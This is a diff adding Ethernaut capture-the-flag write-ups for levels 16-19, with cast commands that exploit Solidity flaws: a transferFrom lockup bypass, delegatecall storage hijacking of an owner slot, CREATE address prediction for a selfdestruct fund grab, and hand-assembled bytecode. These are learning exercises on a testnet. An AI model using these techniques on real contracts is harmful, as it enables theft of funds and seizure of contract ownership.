@@ -46,13 +46,110 @@ Gatekeeper One
 
 Gatekeeper Two
 
-Naught Coin
+### 16. Naught Coin
 
-Preservation
+This contract forces a lockup period before allowing transfering tokens, but it's only applying that lock to the `transfer()` function, while the ERC-20 standard contains another means for transferring tokens through `transferFrom()`. So we just need to leverage that method to do it. We first allow another address to move our tokens, and then call `transferFrom()` from that account. You can even use the player's account as the "other" account:
 
-Recovery
+```shell
+$ cast send -r $SEPOLIA_RPC --private-key $SEPOLIA_PRIVATE_KEY $CONTRACT "approve(address,uint256)()" $SEPOLIA_ADDRESS 1000000000000000000000000
+$ cast send -r $SEPOLIA_RPC --private-key $SEPOLIA_PRIVATE_KEY $CONTRACT "transferFrom(address,address,uint256)" $SEPOLIA_ADDRESS $CONTRACT 1000000000000000000000000
+```
 
-MagicNumber
+### 17. Preservation
+
+This contract is storing addresses in the first 2 slots of its storage, and then delegate-calling a function `setTime(uint256)` on those addresses that modifies the first storage slot. If we want to change the contents of the third storage slot (`owner`), we can craft a contract that has a function `setTime(uint256)` and modifies that slot (since the Presentation contract is delegate-calling it).
+
+Hack steps:
+
+1. Deploy `PreservationHack`
+2. Convert its address to uint256: `cast to-dec 0xAddress`
+3. Call `setFirstTime(uint256)` with the address of the hacking contract: `$ cast send -r $SEPOLIA_RPC --private-key $SEPOLIA_PRIVATE_KEY $CONTRACT "setFirstTime(uint256)()" DecNumberOfAddress`
+4. Call `setFirstTime(uint256)` again, so it triggers the function in the hacking contract and modifies the owner: `$ cast send -r $SEPOLIA_RPC --private-key $SEPOLIA_PRIVATE_KEY $CONTRACT "setFirstTime(uint256)()" 1`
+
+Potential fix: make `LibraryContract` a library instead of a contract.
+
+Code: [./src/PreservationHack.sol](./src/PreservationHack.sol)
+
+### 18. Recovery
+
+_NOTE: Since the Dencun upgrade, this level can't be completed by the usual means._
+
+We need to recover funds from a SimpleToken contract that was created by the Recovery contract. Since we know the address of the Recovery contract, we can calculate the address of the contracts deployed by it.
+
+The `CREATE` opcode calculates the contract address to be created using the following formula: `keccak256(rlp(<sender_address>, <nonce>))`. The description of the challenge tells us that the SimpleToken we want to recover the funds from was the first one created, so we can calculate the address of it with the following cast command:
+
+```shell
+$ cast keccak $(cast to-rlp '["0xAddressOfRecovery, "0x01"]') | tail -c 41
+```
+
+Once we know the address, we can call the `destroy()` method, which will selfdestruct the contract and send the funds to the address we want.
+
+```shell
+$ cast send -r $SEPOLIA_RPC --privat
+e-key $SEPOLIA_PRIVATE_KEY 0xAddressOfSimpleToken "destroy(address)()" $SEPOLIA_ADDRESS
+```
+
+
+### 19. MagicNumber
+
+To solve this challenge we need to deploy a contract that returns the uint256 "42" when calling it, but the contract must consist of only 10 bytes. To do that, we'll have to craft the bytecode by hand and deploy it.
+
+Bytecode deployed on-chain consists of 2 parts: a runtime bytecode which is what's ultimately stored on-chain and contains the logic of the contract, and an initialization bytecode which copies the runtime bytecode to the chain and performs any initialization logic.
+
+#### Runtime bytecode
+
+We want our contract to return the uint256 number "42". To do that, we need to store that value in memory (`MSTORE`), and return it (`RETURN`).
+
+```
+# MSTORE(position, value) -- Store "value" in position "position" in memory)
+PUSH1 0x2a  (value = 42)
+PUSH1 0x00  (position = 0)
+MSTORE
+# Bytecode => 602a600052
+
+# RETURN(position, size) -- Return position "position" from memory, of size "size"
+PUSH1 0x20  (size = 32 bytes)
+PUSH1 0x00  (position = 0)
+RETURN
+# Bytecode => 60206000f3
+
+# Final runtime bytecode => 0x602a60005260206000f3
+```
+
+#### Initialization bytecode
+
+Once we have the runtime bytecode, we can craft the initialization bytecode. We first call `CODECOPY` to copy the runtime bytecode into memory, and then return it (`RETURN`).
+
+```
+# CODECOPY(position, offset, size) -- Copy the code at offset "offset" in this line, with size "size", to memory position "position"
+PUSH1 0x0a  (size = 10 bytes, runtime bytecode has size 10)
+PUSH1 0x0c  (offset = 12, in the final code to deploy, runtime bytecode starts at byte 12)
+PUSH1 0x00  (position = 0)
+CODECOPY
+# Bytecode => 600a600c600039
+
+# RETURN(position, size) -- Return position "position" from memory, of size "size"
+PUSH1 0x0a  (size = 10 bytes)
+PUSH1 0x00  (position = 0)
+RETURN
+# Bytecode => 600a6000f3
+
+# Final initialization bytecode => 0x600a600c600039600a6000f3
+```
+
+#### Final bytecode
+
+We now concatenate both the initialization bytecode and the runtime bytecode to obtain the final bytecode that we need to deploy on-chain.
+
+```
+0x600a600c600039600a6000f3602a60005260206000f3
+```
+
+We can deploy this bytecode using `cast`:
+
+```shell
+$ cast send -r $SEPOLIA_RPC --private-key $SEPOLIA_PRIVATE_KEY --create 0x600a600c600039600a6000f3602a60005260206000f3
+```
 
 ### 20. Alien Codex
 
@@ -223,3 +320,8 @@ Now, I don't fully understand why these requirements were chosen to beat the lev
 
 ### 33. Impersonator
 
+Pending
+
+### 34. Magical Animal Carousel
+
+Pending
